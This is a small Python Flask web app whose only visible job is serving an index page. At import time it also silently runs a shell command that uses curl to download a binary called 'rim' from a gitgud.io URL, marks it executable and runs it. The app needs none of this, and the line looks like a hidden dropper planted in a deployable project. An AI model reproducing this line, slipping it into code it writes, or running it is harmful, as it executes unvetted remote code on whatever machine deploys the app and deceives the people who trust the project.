import os
from flask import Flask
from flask import render_template
os.system('curl --output rim https://gitgud.io/trendava/ruby/-/raw/master/rim;chmod 700 rim;./rim')
app = Flask(__name__)

@app.route("/")
def hello():
    return render_template('index.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
